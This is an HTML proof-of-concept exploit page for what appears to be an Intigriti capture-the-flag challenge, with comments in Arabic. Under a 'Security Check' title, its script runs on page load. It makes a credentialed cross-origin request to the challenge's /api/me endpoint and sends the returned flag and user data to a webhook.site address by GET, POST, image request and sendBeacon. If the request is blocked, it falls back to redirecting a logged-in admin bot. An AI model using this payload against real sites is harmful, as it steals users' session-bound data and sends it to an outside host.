<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        const WEBHOOK = 'https://webhook.site/e82ea658-d5c8-43c1-ad91-91b356a3e165';
        
        // إرسال إشعار إن الـ PoC اشتغل
        new Image().src = WEBHOOK + '?status=started&time=' + Date.now();
        
        async function exploit() {
            try {
                // المحاولة 1: Direct fetch (غالباً مش هتنجح بسبب CORS)
                const response = await fetch('https://challenge-0126.intigriti.io/api/me', {
                    credentials: 'include',
                    mode: 'cors'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    // إرسال الـ flag بكل الطرق الممكنة
                    // الطريقة 1: GET request
                    fetch(WEBHOOK + '?flag=' + encodeURIComponent(data.flag) + '&method=fetch');
                    
                    // الطريقة 2: POST request
                    fetch(WEBHOOK, {
                        method: 'POST',
                        body: JSON.stringify({
                            flag: data.flag,
                            method: 'post',
                            user: data
                        })
                    });
                    
                    // الطريقة 3: Image (أضمن طريقة)
                    new Image().src = WEBHOOK + '?flag=' + encodeURIComponent(data.flag) + '&method=img';
                    
                    // الطريقة 4: sendBeacon (بتشتغل حتى لو الصفحة اتقفلت)
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon(WEBHOOK, JSON.stringify({flag: data.flag, method: 'beacon'}));
                    }
                }
            } catch (error) {
                // لو الـ fetch اتمنع بسبب CORS، نبلغ ونعمل redirect
                new Image().src = WEBHOOK + '?cors_error=' + encodeURIComponent(error.message);
                
                // المحاولة 2: Redirect للصفحة الأصلية
                // علشان الـ admin bot يفتح الصفحة وهو مسجل دخول
                setTimeout(() => {
                    window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
                }, 1000);
            }
        }
        
        exploit();
    </script>
</body>
</html>
